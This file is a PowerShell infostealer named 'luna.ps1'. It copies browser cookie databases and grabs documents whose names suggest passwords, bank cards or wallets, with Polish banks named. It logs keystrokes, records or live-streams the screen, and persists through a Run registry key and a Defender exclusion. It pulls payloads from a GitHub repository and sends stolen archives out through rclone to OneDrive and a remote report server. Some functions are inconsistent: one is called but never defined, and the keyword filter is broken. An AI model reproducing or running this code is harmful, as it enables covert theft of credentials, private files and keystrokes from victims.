# luna.ps1 - PowerShell Agent with Cookie, File Collection, Media Capture, and Keylogging

$serverUrl = "https://onclick-back.onrender.com"
$tempDir = "$env:TEMP\luna"
$cookieDir = "$tempDir\cookies"
$fileDumpDir = "$tempDir\files"
$logPath = "$tempDir\log.json"
$keylogPath = "$tempDir\keylog.txt"
$videoPath = "$tempDir\screen_capture.mp4"

New-Item -ItemType Directory -Force -Path $tempDir, $cookieDir, $fileDumpDir | Out-Null

Start-Transcript -Path "$tempDir\session.log" -Append
Write-Output "[*] Started at $(Get-Date)"

function Collect-Cookies {
    $targets = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data",
        "$env:APPDATA\Mozilla\Firefox\Profiles",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    )
    $patterns = @("*Cookies*", "*.sqlite", "*.ldb", "*.log")
    foreach ($root in $targets) {
        if (Test-Path $root) {
            Get-ChildItem -Path $root -Recurse -Include $patterns -ErrorAction SilentlyContinue |
            Where-Object { $_.Length -gt 0 } |
            ForEach-Object {
                $name = ($_.FullName -replace '[^\w\d\-_\.]', '_')
                Copy-Item $_.FullName "$cookieDir\$name" -Force -ErrorAction SilentlyContinue
            }
        }
    }
}


function Collect-Files {
    $targets = @("Desktop", "Documents", "Downloads") | ForEach-Object { "$env:USERPROFILE\$_" }
    $extensions = "*.pdf", "*.doc*", "*.xls*", "*.txt"
    $keywords = @("haslo", "login", "password", "secret", "bank", "karta", "card", "visa", "dane", "konto", "portfel", "millenium", "pko", "pekao", "sber", "wallet")
    $maxSize = 5MB

    foreach ($dir in $targets) {
        foreach ($ext in $extensions) {
            Get-ChildItem -Path $dir -Recurse -Include $ext -File -ErrorAction SilentlyContinue |
            Where-Object { $_.Length -le $maxSize -and ($keywords | Where-Object { $_ -and $_ -in $_.Name.ToLower() }) } |
            ForEach-Object {
                $name = ($_.Name -replace '[^\w\d\-_\.]', '_')
                Copy-Item $_.FullName "$fileDumpDir\$name" -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

function Start-Stream {
    $ffmpeg = "$PSScriptRoot\ffmpeg.exe"
    $rtmp = "rtmp://a.rtmp.youtube.com/live2/wqrj-k80s-cwwq-7wct-3rc8"
    if (!(Test-Path $ffmpeg)) { return }

    Start-Process -FilePath $ffmpeg -ArgumentList @(
        "-f", "gdigrab", "-framerate", "15", "-i", "desktop",
        "-f", "dshow", "-i", "audio=virtual-audio-capturer",
        "-vcodec", "libx264", "-preset", "veryfast", "-tune", "zerolatency",
        "-acodec", "aac", "-ar", "44100", "-b:a", "128k",
        "-f", "flv", $rtmp
    ) -NoNewWindow
}

"" | Out-File -Encoding utf8 -Force $keylogPath
Start-Job -ScriptBlock {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -TypeDefinition '
    using System; using System.Runtime.InteropServices;
    public class KeyLogger {
        [DllImport("User32.dll")] public static extern short GetAsyncKeyState(Int32 vKey);
    }'
    $map = @{ 8 = "[Back]"; 13 = "[Enter]"; 32 = " "; 27 = "[Esc]"; 9 = "[Tab]" }
    $logPath = "$env:TEMP\luna\keylog.txt"
    while ($true) {
        for ($i = 1; $i -le 255; $i++) {
            if ([KeyLogger]::GetAsyncKeyState($i) -eq -32767) {
                $char = try { if ($map[$i]) { $map[$i] } else { [char]$i } } catch { "[?]" }
                Add-Content -Path $logPath -Value "$(Get-Date -Format HH:mm:ss) $char" -Encoding utf8
            }
        }
        Start-Sleep -Milliseconds 50
    }
}

function Start-Recording {
    param([string]$Mode = "record")
    $ffmpeg = "$PSScriptRoot\ffmpeg.exe"
    if (!(Test-Path $ffmpeg)) { Write-Warning "ffmpeg not found"; return }

    if ($Mode -eq "record") {
        $output = "$tempDir\screen_capture.mp4"
        $args = "-y -f gdigrab -framerate 15 -i desktop -t 00:01:00 -vcodec libx264 `"$output`""
        $proc = Start-Process -FilePath $ffmpeg -ArgumentList $args -WindowStyle Hidden -PassThru
        $proc.WaitForExit()
    } elseif ($Mode -eq "stream") {
        Start-Process -FilePath $ffmpeg -ArgumentList "-f gdigrab -i desktop -f flv rtmp://a.rtmp.youtube.com/live2/YOURKEY" -WindowStyle Hidden
    }
}

function Ensure-Autostart {
    $path = "$env:APPDATA\Microsoft\Windows\luna"
    if (!(Test-Path $path)) {
        New-Item -ItemType Directory -Path $path -Force | Out-Null
        $repo = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/luna"
        $files = @("luna.ps1", "rclone.exe", "rclone.conf", "ffmpeg.exe", "luna_launcher.bat")
        foreach ($f in $files) {
            Invoke-WebRequest "$repo/$f" -OutFile "$path\$f" -UseBasicParsing
        }
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "luna" -Value "$path\luna_launcher.bat"
        Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
    }
}

function Archive-And-Report {
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $user = $env:USERNAME
    $zipPath = "$env:USERPROFILE\luna_${user}_$timestamp.zip"
    $report = @{ user = $user; host = $env:COMPUTERNAME; timestamp = $timestamp }
    $meta = "$tempDir\info.txt"

    $report | ConvertTo-Json -Depth 5 | Set-Content -Path $logPath -Encoding utf8
    "System: $user@$env:COMPUTERNAME`nDate: $timestamp" | Set-Content $meta

    Compress-Archive -Path $logPath, $meta, "$fileDumpDir\*", "$cookieDir\*", $keylogPath, $videoPath -DestinationPath $zipPath -Force -Verbose
    & "$PSScriptRoot\rclone.exe" copy "$zipPath" "onedrive:luna_uploads/$user/$timestamp/" --config "$PSScriptRoot\rclone.conf" --quiet

    $summary = "Files: $((Get-ChildItem $fileDumpDir -Recurse).Count), Cookies: $((Get-ChildItem $cookieDir).Count)"
    Invoke-RestMethod -Uri "$serverUrl/report" -Method POST -Body (@{ text = $summary } | ConvertTo-Json -Compress) -ContentType "application/json"
}

function Upload-To-OneDrive {
    param(
        [string]$ZipPath,
        [string]$UserName,
        [string]$Timestamp
    )

    $rcloneExe = "$PSScriptRoot\rclone.exe"
    $rcloneConf = "$PSScriptRoot\rclone.conf"
    $remoteFolder = "onedrive:luna_uploads/$UserName/$Timestamp/"

    if (!(Test-Path $rcloneExe) -or !(Test-Path $rcloneConf)) {
        Write-Warning "rclone or config missing"
        return
    }

    & "$rcloneExe" copy "$ZipPath" "$remoteFolder" --config "$rcloneConf" --create-empty-src-dirs --quiet

    if ($LASTEXITCODE -eq 0) {
        Write-Output "Upload successful"
    } else {
        Write-Warning "rclone upload failed with code $LASTEXITCODE"
    }
}
function Send-Telegram {
    param(
        [PSCustomObject]$Report,
        [string]$FilesCount,
        [string]$CookiesCount
    )

    if (-not $Report) {
        Write-Warning "No report data to send"
        return
    }

    $text = @"
PowerShell Identity Report
----------------------
User: $($Report.user)
Machine: $($Report.host)
OS: $($Report.os) $($Report.version)
Arch: $($Report.arch)
CPU: $($Report.cpu)
Time: $($Report.timestamp)

Files: $FilesCount
Cookies: $CookiesCount
----------------------
"@

    try {
        Invoke-RestMethod -Uri "$serverUrl/report" -Method POST -Body (@{ text = $text } | ConvertTo-Json -Compress) -ContentType "application/json"
    } catch {
        Write-Warning "Telegram send failed: $_"
    }
}

function Cleanup {
    try {
        Remove-Item "$tempDir\*" -Recurse -Force -ErrorAction SilentlyContinue
        Write-Output "Temp cleaned"
    } catch {
        Write-Warning "Cleanup failed"
    }
}

# === MAIN LOOP ===
while ($true) {
    Collect-Cookies
    Collect-Files
    Start-Stream
    Start-Sleep -Seconds 5
    Ensure-Autostart
    Start-Sleep -Seconds 60
    Archive-And-Upload
    Cleanup

    function Self-Update {
        $url = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/luna/luna.ps1"
        $local = "$PSScriptRoot\luna.ps1"
        try {
            Invoke-WebRequest -Uri $url -OutFile $local -UseBasicParsing
            Write-Output "Self-update complete"
            Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$local`"" -WindowStyle Hidden
            exit
        } catch {
            Write-Warning "Self-update failed: $_"
        }
    }


    Self-Update
    Write-Output "Restarting after update..."
    Start-Process -FilePath "$local" -WindowStyle Hidden
    exit
}


Stop-Transcript
